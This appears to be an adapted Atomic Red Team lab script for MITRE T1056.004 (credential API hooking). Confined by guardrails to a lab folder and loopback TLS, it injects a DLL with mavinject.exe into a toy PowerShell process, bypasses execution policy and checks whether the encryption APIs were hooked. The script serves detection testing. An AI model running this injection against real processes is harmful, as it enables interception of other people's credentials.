# ATA106 - T1056.004 Credential API Hooking (Windows)
# ART_adaptado: inyectar T1056.004x64.dll en un PowerShell de juguete con TLS local; log del hook; guardarrail C:\lab-attack\ATA106\; sin red externa.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA106*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$dll = Join-Path $dir 'T1056.004x64.dll'
if (-not (Test-Path $dll)) {
    'GUARDARRAIL: DLL ausente' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}
if ((Get-Item $dll).Length -ne 127488) {
    'GUARDARRAIL: DLL tamano inesperado' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}
$toy = Join-Path $dir 'ATA106_toy.ps1'
$toySrc = @'
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
Start-Sleep -Seconds 5
try { Invoke-WebRequest -Uri 'https://127.0.0.1:8443/' -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}
'@
Set-Content -Path $toy -Value $toySrc -Encoding ascii
$server = Start-Job -ScriptBlock {
    param($p, $dir)
    $cert = New-SelfSignedCertificate -DnsName 'localhost' -CertStoreLocation 'Cert:\CurrentUser\My' -ErrorAction Stop
    $l = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback, $p)
    $l.Start()
    Set-Content -Path (Join-Path $dir 'server_ready.txt') -Value 'ready' -Encoding ascii
    $c = $l.AcceptTcpClient()
    $ssl = New-Object System.Net.Security.SslStream($c.GetStream(), $false)
    $ssl.AuthenticateAsServer($cert, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)
    $buf = New-Object byte[] 4096
    $ssl.Read($buf, 0, $buf.Length) | Out-Null
    $resp = [Text.Encoding]::ASCII.GetBytes("HTTP/1.1 200 OK`r`nContent-Length: 2`r`nConnection: close`r`n`r`nOK")
    $ssl.Write($resp, 0, $resp.Length)
    $ssl.Flush()
    $ssl.Close()
    $c.Close()
    $l.Stop()
} -ArgumentList 8443, $dir
$ready = Join-Path $dir 'server_ready.txt'
for ($i = 0; $i -lt 20; $i++) { if (Test-Path $ready) { break }; Start-Sleep -Milliseconds 500 }
$hookLog = Join-Path $dir 'hook.log'
$hookErr = Join-Path $dir 'hook_err.log'
$toyProc = Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$toy -RedirectStandardOutput $hookLog -RedirectStandardError $hookErr -PassThru
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$inj = $false
$mav = Join-Path $env:WINDIR 'System32\mavinject.exe'
if (Test-Path $mav) {
    & $mav $toyProc.Id /INJECTRUNNING $dll 2>&1 | Out-File (Join-Path $dir 'mavinject.out') -Encoding ascii
    $inj = ($LASTEXITCODE -eq 0)
}
Start-Sleep -Seconds 14
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
Stop-Process -Id $toyProc.Id -Force -ErrorAction SilentlyContinue
Stop-Job $server -ErrorAction SilentlyContinue
Remove-Job $server -Force -ErrorAction SilentlyContinue
$hook = ''
if (Test-Path $hookLog) { $hook = Get-Content $hookLog -Raw }
if (-not $hook -and (Test-Path $hookErr)) { $hook = Get-Content $hookErr -Raw }
$hookOk = ($hook -match 'HOOKED CAPTURE LOG|EncryptMessage|DecryptMessage')
@(
    "ata=ATA106", "tecnica=T1056.004", "fuente=ART_adaptado",
    "t0=$t0", "t1=$t1", "dll=$dll", "toy=$toy",
    "inyectado=$inj", "hook_log=$hookOk", "efecto_parcial=$(-not $hookOk)"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
